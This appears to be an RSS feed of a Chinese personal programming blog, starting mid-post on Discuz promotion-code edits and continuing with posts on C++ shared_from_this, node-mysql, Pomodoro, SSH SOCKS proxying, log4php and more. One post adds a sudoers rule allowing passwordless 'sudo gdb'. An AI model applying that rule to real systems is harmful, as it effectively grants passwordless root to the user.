<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>((!<span style="color: #c5c8c6; background-color: #1d1f21;">empty(</span>$<span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>]) || !<span style="color: #c5c8c6; background-color: #1d1f21;">empty(</span>$<span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuser'</span>]))<span style="text-decoration: underline;"> &amp;&amp; ($</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_visit'</span><span style="text-decoration: underline;">] || $</span><span style="color: #81a2be; text-decoration: underline;">this</span><span style="text-decoration: underline;">-&gt;</span><span style="color: #f0c674; text-decoration: underline;">var</span><span style="text-decoration: underline;">[</span><span style="color: #8abeb7; text-decoration: underline;">'setting'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'creditspolicy'</span><span style="text-decoration: underline;">][</span><span style="color: #8abeb7; text-decoration: underline;">'promotion_register'</span><span style="text-decoration: underline;">])) {</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">require_once</span> <span style="color: #c5c8c6; background-color: #1d1f21;">libfile(</span><span style="color: #8abeb7;">'misc/promotion'</span>, <span style="color: #8abeb7;">'include'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   }
}
</pre>
</div>

<p>
修改source/include/misc/misc_promotion.php文件，将下面的内容：
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">if</span>(!<span style="color: #c5c8c6; background-color: #1d1f21;">empty(</span>$<span style="color: #81a2be;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>])) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fromuid</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">intval(</span>$<span style="color: #81a2be;">_GET</span>[<span style="color: #8abeb7;">'fromuid'</span>]);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fromuser</span> = <span style="color: #8abeb7;">''</span>;
} <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fromuser</span> = $<span style="color: #81a2be;">_GET</span>[<span style="color: #8abeb7;">'fromuser'</span>];
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fromuid</span> = <span style="color: #8abeb7;">''</span>;
}
</pre>
</div>
<p>
改为：
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b5bd68;">if</span>(!<span style="color: #c5c8c6; background-color: #1d1f21;">empty(</span>$<span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>])) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fromuid</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">intval(</span>$<span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuid'</span>]);
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fromuser</span> = <span style="color: #8abeb7;">''</span>;
} <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fromuser</span> = $<span style="color: #f0c674;">referer_get</span>[<span style="color: #8abeb7;">'fromuser'</span>];
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">fromuid</span> = <span style="color: #8abeb7;">''</span>;
}
</pre>
</div>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[为什么不能在构造函数中调用shared_from_this]]></title>
            <link>/article/4e3a4ec04e484e0d80fd57286784902051fd65704e2d8c037528-shared_from_this.html</link>
            <guid>/article/4e3a4ec04e484e0d80fd57286784902051fd65704e2d8c037528-shared_from_this.html</guid>
            <pubDate>Thu, 19 Dec 2013 17:02:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
先看示例代码：
</p>

<div class="org-src-container">

<pre class="src src-c++"><span style="color: #b5bd68;">class</span> <span style="color: #81a2be;">Chicken</span> : <span style="color: #b5bd68;">public</span> <span style="color: #81a2be;">enable_shared_from_this</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt;
{
<span style="color: #b5bd68;">public</span>:
<span style="background-color: #373b41;"> </span>   <span style="color: #de935f;">Chicken</span>()
<span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">shared_ptr</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt; <span style="color: #f0c674;">chicken_ptr</span> = shared_from_this();    <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">throw std::ba</span><span style="color: #969896; font-style: italic; text-decoration: underline;">d_weak_ptr</span>
<span style="background-color: #373b41;"> </span>   }
};
</pre>
</div>

<p>
再看shared_from_this()的行为：
</p>
<div class="org-src-container">

<pre class="src src-c++"><span style="color: #b5bd68;">return</span> _weak_ptr-&gt;lock();
</pre>
</div>

<p>
<code>_weak_ptr</code> 为父类（ <code>enable_shared_from_this</code> &lt;Chicken&gt;）的成员变量，需要一个 <code>shared_ptr</code> &lt;Chicken&gt;对象来初始化它，而 <code>shared_ptr</code> &lt;Chicken&gt;需要一个Chicken对象来创建，但此时Chicken对象正在构造中，这是个鸡与蛋的无解问题。
</p>

<p>
其实 <code>_weak_ptr</code> 成员变量是在 <code>shared_ptr</code> 的构造函数中延迟初始化的，不只是在构造函数中不能调用 <code>shared_from_this</code> ，像下面的使用方式同样不行：
</p>
<div class="org-src-container">

<pre class="src src-c++"><span style="color: #81a2be;">Chicken</span>* <span style="color: #f0c674;">chicken</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Chicken</span>();
<span style="color: #81a2be;">shared_ptr</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt; <span style="color: #f0c674;">chicken_ptr</span> = chicken-&gt;shared_from_this();  <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">throw std::bad</span><span style="color: #969896; font-style: italic; text-decoration: underline;">_weak_ptr</span>
</pre>
</div>

<p>
<code>enable_shared_from_this</code> 不是从this祼指针变出智能指针的魔法，它只是一个辅助类，为一个只使用 <code>shared_ptr</code> 管理对象生命周期的类添加一个自身的智能指针成员变量供内部使用。
</p>

<p>
而“不能在构造函数中调用 <code>shared_from_this</code> ”这个问题仅仅是标准实现上的一个漏洞。
</p>

<p>
你应该像下面这样用：
</p>
<div class="org-src-container">

<pre class="src src-c++"><span style="color: #b5bd68;">class</span> <span style="color: #81a2be;">Chicken</span> : <span style="color: #b5bd68;">public</span> <span style="color: #81a2be;">enable_shared_from_this</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt;
{
<span style="color: #b5bd68;">public</span>:
<span style="background-color: #373b41;"> </span>   <span style="color: #de935f;">Chicken</span>()
<span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">void</span> <span style="color: #de935f;">use</span>()
<span style="background-color: #373b41;"> </span>   {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #81a2be;">shared_ptr</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt; <span style="color: #f0c674;">chicken_ptr</span> = shared_from_this();
<span style="background-color: #373b41;"> </span>   }
};

<span style="color: #81a2be;">shared_ptr</span>&lt;<span style="color: #81a2be;">Chicken</span>&gt; <span style="color: #de935f;">chicken_ptr</span>(<span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">Chicken</span>);
chicken_ptr-&gt;use();
</pre>
</div>

<p>
突然想起一段对话：
</p>
<blockquote>
<p>
阿漆：闻西，事情进行的怎么样了，闻西？
</p>

<p>
达闻西： 最近我发明了些东西，相信能帮得到你。
</p>

<p>
达闻西拿出手电筒。
</p>

<p>
阿漆：手电筒？
</p>

<p>
达闻西：错，这支不是一只普通的手电筒，这支是一支不需要电池的太阳能手电筒，在有光的时候他就会亮。
</p>

<p>
司令：那如果没有光呢？
</p>

<p>
达闻西：绝对不亮。
</p>

<p>
阿漆：有没有可能没光的时候它也会亮？
</p>

<p>
达闻西：问的好，关灯。
</p>

<p>
达闻西：你拿另一只手电筒照它呢，它就会亮。
</p>

<p>
达闻西：哈哈，怎么样啊？
</p>

<p>
阿漆：这个发明还真有创意啊。
</p>
</blockquote>



<p>
参考：《<a href="http://hi.baidu.com/cpuramdisk/item/7c2f8d77385e0f29d7a89cf0">shared_from_this 几个值得注意的地方</a>》</p>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[node.js下访问mysql注意事项]]></title>
            <link>/article/node.js-4e0b8bbf95ee-mysql-6ce8610f4e8b9879.html</link>
            <guid>/article/node.js-4e0b8bbf95ee-mysql-6ce8610f4e8b9879.html</guid>
            <pubDate>Fri, 11 Oct 2013 02:45:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
本文仅针对 <a href="https://github.com/felixge/node-mysql">node-mysql</a> 模块。
</p>

<ul class="org-ul">
<li>Connection 对象为一个到mysql的连接，在其上的query是串行进行的。

<p>
由于mysql协议类似http是串行的，在一个mysql连接上的多个query必须依次进行。
</p>

<p>
<a href="https://github.com/felixge/node-mysql">node-mysql</a> 的 Connection对象上同时发起的多个query会队列化，
</p>

<p>
处理完一个query再进行下一query的处理，传递给回调函数的query结果不会错乱。
</p>

<p>
在有一定访问量的服务中应该总是使用 <code>连接池</code> 。
</p>
</li>
</ul>


<ul class="org-ul">
<li>处理Connection对象的重连。

<p>
mysql连接空闲一段时间后（默认8小时）会自动关闭，
</p>

<p>
可以在Connection对象的 <code>error</code> 事件中检测后连接断开时进行重连。
</p>

<p>
使用 <code>连接池</code> 不会有问题，连接断开后会默认从连接池中剔除。</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用番茄工作法的感受]]></title>
            <link>/article/4f7f7528756a83045de54f5c6cd57684611f53d7.html</link>
            <guid>/article/4f7f7528756a83045de54f5c6cd57684611f53d7.html</guid>
            <pubDate>Mon, 08 Jul 2013 05:10:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">基本要领</h2>
<div class="outline-text-2" id="text-1">
<p>
从事务清单中选出今天要做的事
</p>

<p>
按优先级填入今日工作计划表
</p>

<p>
从表中选择第一项未完成事务按下计时器
</p>

<p>
专心做这件事
</p>

<p>
25钟后铃响立即停止做事
</p>

<p>
在当前事务后标记用掉了一个番茄
</p>

<p>
事务完成则在今日事务清单划掉当前任务
</p>

<p>
专心休息地5分钟（每4个周期长休息15-30分钟）
</p>

<p>
按下计时器
</p>

<p>
继续做事
</p>

<p>
如此往复
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">掌控干扰因素</h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li>做事时如遇实发事件酌情处理：

<ul class="org-ul">
<li>添加到事务清单中明天再处理
</li>
<li>直接安排到今日事务清单稍后处理
</li>
<li>立即取消当前事务开始处理突发事件
</li>
</ul>
</li>

<li>在当前事务后方打个中断标记
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">解读工作记录</h2>
<div class="outline-text-2" id="text-3">
<p>
一天结束后我们将获得以下信息：
</p>

<ul class="org-ul">
<li>知道处理某个事务用时多少。怎样让时间用得更少？
</li>

<li>知道时间花在哪里去了。能否将时间更多花在有效处理工作上？
</li>
</ul>

<p>
当新的一天开始时，我们会清楚地知道每天有多少个番茄可用，今天可以安排多少事务，每个事务需要消耗多少个番茄。
</p>

<p>
随着我们不断地根据这些记录改进我们的工作效率，最终我们能够安排时间、掌控时间。
</p>
</div>
</div>

<div id="outline-container-sec-4" class="outline-2">
<h2 id="sec-4">番茄工作法遵从习惯法则</h2>
<div class="outline-text-2" id="text-4">
<p>
当我跟老婆解释番茄工作法时，她说了句：“这个和你之前说的习惯法则很像”，细细一想不无道理。
</p>

<p>
习惯的形成的三个步骤：暗示、惯常行为、奖赏。以及习惯回路。
</p>

<p>
番茄工作法也有这三个要素：
</p>

<p>
　　暗示　　　　　　按下计时器
</p>

<p>
　　惯常行为　　　　处理事务
</p>

<p>
　　奖赏　　　　　　清脆的铃响、标记番茄的成就感、休息时间的放松
</p>

<p>
而习惯回路的形成也容易发现，每天一早来到公司，谁不渴望今天能够过得充满成就感、休息时能够毫无顾忌呢。
</p>

<p>
遵从习惯法则的方法论才会更容易展开并长久地坚持下去。
</p>
</div>
</div>

<div id="outline-container-sec-5" class="outline-2">
<h2 id="sec-5">参考资料</h2>
<div class="outline-text-2" id="text-5">
<p>
<a href="http://www.pomodorotechnique.com/download/pdf/ThePomodoroTechnique-CHN_v1-3.pdf">《番茄工作法》</a>
<a href="http://baike.baidu.com/view/5259318.htm">番茄工作法_百度百科</a>
<a href="http://pomodoro.kankanan.com">番茄工作法在线服务</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[《理解Node.js》培训课件]]></title>
            <link>/article/300a740689e3-node.js-300b57f98bad8bfe4ef6.html</link>
            <guid>/article/300a740689e3-node.js-300b57f98bad8bfe4ef6.html</guid>
            <pubDate>Thu, 04 Jul 2013 10:31:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
本课件介绍Node.js的特点及其初步使用。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">开发计划 <code>[1/3]</code></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li><code>[X]</code> 编写大纲
</li>
<li><code>[&#xa0;]</code> 编写内容
</li>
<li><code>[&#xa0;]</code> 制作Microsoft PowerPoint格式文档
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">在线演示</h2>
<div class="outline-text-2" id="text-2">
<p>
<a href="http://blog.kankanan.com/slides/%E7%90%86%E8%A7%A3Node.js.html">《理解Node.js》</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[linux下翻墙访问bitbucket.org仓库]]></title>
            <link>/article/linux-4e0b7ffb58998bbf95ee-bitbucket.org-4ed35e93.html</link>
            <guid>/article/linux-4e0b7ffb58998bbf95ee-bitbucket.org-4ed35e93.html</guid>
            <pubDate>Fri, 28 Jun 2013 05:57:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
今天往bitbucket.org push时才发现bitbucket被GFW了。我的仓库为Mercurial hg，hg项目根目录下的 <code>.hg/hgrc</code> 配置文件中可指定http_proxy，试了一下不支持socks代理（我的浏览器用它来翻墙），最终使用tsocks软件实现翻墙访问bitbucket.org仓库。
</p>

<ul class="org-ul">
<li>利用vps建本地socks代理的脚本 <code>ssh_proxy.sh</code>
<div class="org-src-container">

<pre class="src src-sh"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/bin/</span><span style="color: #b5bd68;">bash</span>

<span style="color: #f0c674;">n</span>=<span style="color: #b294bb;">`ps waux | grep 'bash .*/ssh_proxy.sh' | grep -v grep | wc -l`</span>
<span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">n</span> -lt 3 ]; <span style="color: #b5bd68;">then</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> [ true ]; <span style="color: #b5bd68;">do</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #f0c674;">n</span>=<span style="color: #b294bb;">`ps aux | grep 'ssh' | grep '7070' | grep -v grep | wc -l`</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> [ $<span style="color: #f0c674;">n</span> -lt 1 ]; <span style="color: #b5bd68;">then</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"start ssh connecting"</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   ssh -qTnNf -D 7070 user@host
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">fi</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"wait for next checking"</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   sleep 30
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">done</span>
<span style="color: #b5bd68;">fi</span>
<span style="color: #b294bb;">echo</span> <span style="color: #8abeb7;">"ssh_proxy.sh already running"</span>
</pre>
</div>

<p>
请将user@host改为你的vps用户及主机，并配置为免输入密码。
</p>
</li>

<li>启动socks代理脚本

<div class="org-src-container">

<pre class="src src-sh">nohup bash ./ssh_proxy.sh &amp;
</pre>
</div>

<p>
浏览器也可以利用它来翻墙。
</p>
</li>

<li>安装tsocks
<div class="org-src-container">

<pre class="src src-sh">yaourt -S tsocks
</pre>
</div>
</li>

<li>配置tsocks

<p>
<code>/etc/tsocks.conf</code>
</p>
<pre class="example">
# We can access 192.168.0.* directly
local = 192.168.0.0/255.255.255.0
local = 10.0.0.0/255.0.0.0

# Otherwise we use the server
server = 127.0.0.1
server_port = 7070
</pre>
<p>
具体用法 <code>man tsocks.conf</code>
</p>
</li>

<li>使用tsocks让hg用上socks代理功能
<div class="org-src-container">

<pre class="src src-sh">tsocks hg push
</pre>
</div>
<p>
tsocks看起来很通用，应该也可以让git等进行socks代理访问。</p>
</li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[Archlinux下解决更新grub后无法进入gnome3桌面的问题]]></title>
            <link>/article/archlinux-4e0b89e351b366f465b0-grub-540e65e06cd58fdb5165-gnome3-684c9762768495ee9898.html</link>
            <guid>/article/archlinux-4e0b89e351b366f465b0-grub-540e65e06cd58fdb5165-gnome3-684c9762768495ee9898.html</guid>
            <pubDate>Wed, 26 Jun 2013 02:07:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在启动界面上会看到以下错误日志：
</p>
<pre class="example">
kernel: [    8.398186] [drm:radeon_init] *ERROR* No UMS support in radeon module!
</pre>

<p>
这个是由于grub配置文件中指定了内核参数 <code>nomodeset</code> 导致，linux的默认配置是为了运行服务器，以减少启动过程中出错的可能性，使用gnome3桌面时，需去掉内核参数 <code>nomodeset</code> ，以下为<a href="https://wiki.archlinux.org/index.php/ATI#Disable_KMS">原文</a>：
</p>

<pre class="example">
Note: Adding nomodeset to the kernel boot line might prevent GNOME 3's gnome-shell or KDE's desktop effects from running.
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[《理解Http与Spdy协议》培训课件]]></title>
            <link>/article/300a740689e3-http-4e0e-spdy-534f8bae300b57f98bad8bfe4ef6.html</link>
            <guid>/article/300a740689e3-http-4e0e-spdy-534f8bae300b57f98bad8bfe4ef6.html</guid>
            <pubDate>Thu, 23 May 2013 05:11:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
本课件针对刚入职的毕业生，讲解Http与Spdy协议的基础知识。
</p>

<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">开发计划 <code>[1/5]</code></h2>
<div class="outline-text-2" id="text-1">
<ul class="org-ul">
<li><code>[X]</code> 编写Http部分大纲
</li>
<li><code>[&#xa0;]</code> 编写Http部分章节内容
</li>
<li><code>[&#xa0;]</code> 编写Spdy部分大纲
</li>
<li><code>[&#xa0;]</code> 编写Spdy部分章节内容
</li>
<li><code>[&#xa0;]</code> 制作Microsoft PowerPoint格式文档
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">在线演示</h2>
<div class="outline-text-2" id="text-2">
<p>
<a href="http://blog.kankanan.com/slides/%E7%90%86%E8%A7%A3Http%E4%B8%8ESpdy%E5%8D%8F%E8%AE%AE.html">《理解Http与Spdy协议》</a></p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[log4php初步使用]]></title>
            <link>/article/log4php-521d6b654f7f7528.html</link>
            <guid>/article/log4php-521d6b654f7f7528.html</guid>
            <pubDate>Mon, 06 May 2013 10:32:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">简介</h2>
<div class="outline-text-2" id="text-1">
<p>
apache出品必属精品。正宗php日志库，与log4j一脉相承。
</p>

<p>
<a href="http://logging.apache.org/log4php/">http://logging.apache.org/log4php/</a>
</p>
</div>
</div>

<div id="outline-container-sec-2" class="outline-2">
<h2 id="sec-2">安装</h2>
<div class="outline-text-2" id="text-2">
<p>
参考：<a href="http://logging.apache.org/log4php/install.html">http://logging.apache.org/log4php/install.html</a>
</p>

<ul class="org-ul">
<li>有root权限，安装到系统目录

<div class="org-src-container">

<pre class="src src-sh">sudo apt-get install php-pear
sudo pear channel-discover pear.apache.org/log4php
sudo pear install log4php/Apache_log4php
</pre>
</div>
</li>

<li>没有root权限，安装到当前目录下

<div class="org-src-container">

<pre class="src src-sh"><span style="color: #b294bb;">cd</span> libs
wget http://mirrors.tuna.tsinghua.edu.cn/apache/logging/log4php/2.3.0/apache-log<span style="text-decoration: underline;">4php-2.3.0-src.tar.gz</span>
tar xzvf apache-log4php-2.3.0-src.tar.gz
ln -sf apache-log4php-2.3.0/src/main/php ./log4php
</pre>
</div>
</li>
</ul>
</div>
</div>

<div id="outline-container-sec-3" class="outline-2">
<h2 id="sec-3">使用</h2>
<div class="outline-text-2" id="text-3">
<ul class="org-ul">
<li>进行一下封装定制，可以满足绝大部分情况下的使用

<ul class="org-ul">
<li>类似nginx的访问日志记录格式
</li>
<li>日志中输出文件名及行号
</li>
<li>日志文件数据限制为10个，每个日志文件大小为10MB
</li>
</ul>
<p>
<a href="../static/logging.inc">logging.inc</a>
</p>
</li>

<li>使用示例

<p>
<code>example.php</code>
</p>
<div class="org-src-container">

<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">define(</span><span style="color: #8abeb7;">'LOGGING_APPNAME'</span>, <span style="color: #8abeb7;">'example'</span>);
<span style="color: #b5bd68;">require_once</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">dirname(</span><span style="color: #81a2be;">__FILE__</span>) . <span style="color: #8abeb7;">"/logging.inc"</span>);

$<span style="color: #f0c674;">logger</span> = <span style="color: #81a2be;">Logger</span>::<span style="color: #c5c8c6; background-color: #1d1f21;">getLogger(</span><span style="color: #8abeb7;">"main"</span>);
$<span style="color: #f0c674;">logger</span>-<span style="color: #81a2be;">&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21;">debug</span>(<span style="color: #8abeb7;">"info log"</span>);
$<span style="color: #f0c674;">logger</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">warn</span>(<span style="color: #8abeb7;">"info log"</span>);
$<span style="color: #f0c674;">logger</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">error</span>(<span style="color: #8abeb7;">"info log"</span>);
<span style="color: #b294bb;">?&gt;</span>
</pre>
</div>
</li>

<li>运行结果

<div class="org-src-container">

<pre class="src src-sh">$ php ./example.php
$ tail -f ./logs/example.log
2013-05-06 18:24:57,925 [DEBUG] main: info log (/home/tangxinfa/php/example.php:<span style="text-decoration: underline;">6)</span>
2013-05-06 18:24:57,930 [WARN] main: info log (/home/tangxinfa/php/example.php:7<span style="text-decoration: underline;">)</span>
2013-05-06 18:24:57,930 [ERROR] main: info log (/home/tangxinfa/php/example.php:<span style="text-decoration: underline;">8)</span>
</pre>
</div>
</li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[使用o-blog搭建个人博客]]></title>
            <link>/article/4f7f7528-o-blog-642d5efa4e2a4eba535a5ba2.html</link>
            <guid>/article/4f7f7528-o-blog-642d5efa4e2a4eba535a5ba2.html</guid>
            <pubDate>Tue, 09 Apr 2013 04:30:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
新的博客使用<a href="http://renard.github.com/o-blog">o-blog</a>搭建，使用的是自已的分枝<a href="https://github.com/tangxinfa/o-blog">tangxinfa-o-blog</a>，我的分枝主要是对原系统做了一定的简化以便适用于创建个人博客，另修复了一些bug（主要是中文相关），可使用以下配置安装我的分枝：
</p>
<div class="org-src-container">

<pre class="src src-lisp">(setq el-get-sources '((<span style="color: #b294bb;">:name</span> tangxinfa-o-blog
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> <span style="color: #b294bb;">:type</span> git<span style="color: #cc6666; background-color: #373b41;"> </span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> <span style="color: #b294bb;">:url</span> <span style="color: #8abeb7;">"https://github.com/tangxinfa/o-blog.git"</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> <span style="color: #b294bb;">:load</span> <span style="color: #8abeb7;">"o-blog.el"</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span> <span style="color: #b294bb;">:features</span> o-blog)))
</pre>
</div>
<div class="org-src-container">

<pre class="src src-sh">M-x el-get-install tangxinfa-o-blog
</pre>
</div>

<p>
具体使用可参考本博客的原始org文件：
</p>

<div class="org-src-container">

<pre class="src src-sh">git clone https://github.com/tangxinfa/tangxinfa.github.com.git
</pre>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[如何学习英语]]></title>
            <link>/article/59824f555b664e6082f18bed.html</link>
            <guid>/article/59824f555b664e6082f18bed.html</guid>
            <pubDate>Sun, 07 Apr 2013 01:49:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
经过一天的英孚及韦博试听，总结出以下几点：
</p>
<dl class="org-dl">
<dt> 语法 </dt><dd>    熟读常用句型，扩展至类似语句，从中提炼语法，另一方面也可以练就一口流利的日用口语。
</dd>
<dt> 听力 </dt><dd>    不会说就不会听，多说才能够快速识别听到的东西。
</dd>
<dt> 阅读 </dt><dd>    多记单词，不断的重复重复再重复，直到看到单词脱口而出。
</dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在emacs中如何以root权限使用gdb调试程序]]></title>
            <link>/article/5728-emacs-4e2d59824f554ee5-root-674396504f7f7528-gdb-8c038bd57a0b5e8f.html</link>
            <guid>/article/5728-emacs-4e2d59824f554ee5-root-674396504f7f7528-gdb-8c038bd57a0b5e8f.html</guid>
            <pubDate>Sat, 30 Mar 2013 06:21:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li>由于M-x命令中使用sudo输入密码无效，需要配置为允许用户sudo gdb免密码
</li>
</ul>
<pre class="example">
visudo
# Allow user to sudo gdb without password
用户 ALL=NOPASSWD: /usr/bin/gdb
</pre>

<ul class="org-ul">
<li>使用root权限启动gdb
</li>
</ul>
<pre class="example">
M-x gdb
sudo gdb &lt;program&gt; &lt;pid&gt; --annotate=3
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[二维码研究]]></title>
            <link>/article/4e8c7ef4780178147a76.html</link>
            <guid>/article/4e8c7ef4780178147a76.html</guid>
            <pubDate>Sat, 30 Mar 2013 03:21:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-sec-1" class="outline-2">
<h2 id="sec-1">介绍</h2>
<div class="outline-text-2" id="text-1">
<dl class="org-dl">
<dt> <a href="http://www.itsc.org.sg/pdf/synthesis08/Three_QR_Code.pdf">Three_QR_Code.pdf</a> </dt><dd>     RFC式的文档
</dd>

<dt> <a href="http://suflow.iteye.com/blog/1100678">二维码 编码原理简介</a> </dt><dd>     通俗易懂的编码细节介绍
</dd>

<dt> <a href="http://zh.wikipedia.org/wiki/QR%E7%A2%BC">QR碼 - 维基百科，自由的百科全书</a> </dt><dd>
</dd>

<dt> <a href="http://www.qrstuff.com/blog/2011/11/23/qr-code-minimum-size">QR Code Minimum Size</a> 与 <a href="http://www.qrstuff.com/blog/2011/01/18/what-size-should-a-qr-code-be">What Size Should A Printed QR Code Be?</a> </dt><dd>     关于可识别性的一些结论，该网站上有大量二维码研究相关的文章
</dd>
</dl>
</div>
</div>

